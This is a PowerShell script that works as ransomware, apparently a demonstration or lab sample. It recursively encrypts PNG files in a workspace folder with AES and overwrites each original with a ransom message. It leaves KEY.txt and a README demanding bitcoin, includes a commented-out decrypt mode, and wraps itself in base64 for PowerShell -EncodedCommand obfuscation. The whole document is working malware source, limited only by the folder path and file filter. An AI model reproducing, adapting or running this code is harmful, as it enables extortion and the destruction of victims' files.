$Script = @'
$Mode = 'Encrypt'
$AESKey = New-Object Byte[] 32
[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($AESKey)
$Key = [Convert]::ToBase64String($AESKey)
$Path = 'D:\RansomwareWorkspace'
$FilesInDirectory = @()
$FilesInDirectory += Get-ChildItem -Path $Path -Recurse -ErrorAction SilentlyContinue -Filter *.png
$AttackerMessage = 'Your computer has been attacked, all files on this computer are unavailable until you meet our demands. Open the readme file for further instructions.'
$AttackerMessageAddition = 'Send X BTC to Y wallet until Z date. Do not delete any of the files as this may make retrieving your files impossible.'

<# Uncomment these lines and comment the first 9 lines to decrypt the files
$Mode = 'Decrypt'
$Path = 'D:\RansomwareWorkspace'
$Key = Get-Content ($Path + '\key.txt')
$FilesInDirectory = @()
$FilesInDirectory += Get-ChildItem -Path $Path -Recurse -ErrorAction SilentlyContinue -Filter *.png.aes
$AttackerMessageDecrypt = 'All your files have been decrypted. Contact X in case of problems.'
#>

$shaManaged = New-Object System.Security.Cryptography.SHA256Managed
$aesManaged = New-Object System.Security.Cryptography.AesManaged
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$aesManaged.BlockSize = 128
$aesManaged.KeySize = 256

$aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

if(Test-Path -Path $Path)
{
    switch ($Mode) {
        'Encrypt' {
            ForEach($File in $FilesInDirectory){
                $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName + ".aes"

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes

                [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime     
                Set-Content $File.FullName $AttackerMessage
            }
            Set-Content ($Path + '\KEY.txt') $Key
            Set-Content ($Path + '\README.txt') $AttackerMessageAddition
        }

        'Decrypt' {
            ForEach($File in $FilesInDirectory){
                $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName -replace ".aes"

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)

                [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                Remove-Item $File.FullName
            }
            Set-Content ($Path + '\README.txt') $AttackerMessageDecrypt
        }
    }  
}
'@

$EncodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Script))
powershell.exe Write-Output $EncodedScript
#powershell.exe -EncodedCommand JABUAGkAdABsAGUAIAA9ACAAIgBTAEEAUgAwADAAOAAzACIADQAKACQATQBlAHMAcwBhAGcAZQAgAD0AIAAiAEQAbwBiAHIA/QAgAGQAZQBuACwAIAB0AGEAdABvACAAbgBvAHQAaQBmAGkAawBhAGMAZQAgAHMAZQAgAHoAbwBiAHIAYQB6AGkAbABhACAAZADtAGsAeQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABzAGsAcgBpAHAAdAB1ACwAIABrAHQAZQByAP0AIAB2AHoAbgBpAGsAbAAgAHYAIAByAOEAbQBjAGkAIAA0AC4AIABjAHYAaQANAWUAbgDtACAAcABZAWUAZABtABsBdAB1ACAAUABWAEIAUABTAC4AIgANAAoAJABUAHkAcABlACAAPQAgACIAaQBuAGYAbwAiAA0ACgANAAoAWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AGwAbwBhAGQAdwBpAHQAaABwAGEAcgB0AGkAYQBsAG4AYQBtAGUAKAAiAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAiACkAIAB8ACAAbwB1AHQALQBuAHUAbABsAA0ACgAkAHAAYQB0AGgAIAA9ACAARwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBpAGQAIAAkAHAAaQBkACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAFAAYQB0AGgADQAKACQAaQBjAG8AbgAgAD0AIABbAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAuAEkAYwBvAG4AXQA6ADoARQB4AHQAcgBhAGMAdABBAHMAcwBvAGMAaQBhAHQAZQBkAEkAYwBvAG4AKAAkAHAAYQB0AGgAKQANAAoAJABuAG8AdABpAGYAeQAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgB3AGkAbgBkAG8AdwBzAC4AZgBvAHIAbQBzAC4AbgBvAHQAaQBmAHkAaQBjAG8AbgANAAoAJABuAG8AdABpAGYAeQAuAGkAYwBvAG4AIAA9ACAAJABpAGMAbwBuAA0ACgAkAG4AbwB0AGkAZgB5AC4AdgBpAHMAaQBiAGwAZQAgAD0AIAAkAHQAcgB1AGUADQAKACQAbgBvAHQAaQBmAHkALgBzAGgAbwB3AGIAYQBsAGwAbwBvAG4AdABpAHAAKAAxADAALAAkAFQAaQB0AGwAZQAsACQATQBlAHMAcwBhAGcAZQAsACAAWwBzAHkAcwB0AGUAbQAuAHcAaQBuAGQAbwB3AHMALgBmAG8AcgBtAHMALgB0AG8AbwBsAHQAaQBwAGkAYwBvAG4AXQA6ADoAJABUAHkAcABlACkA
#pause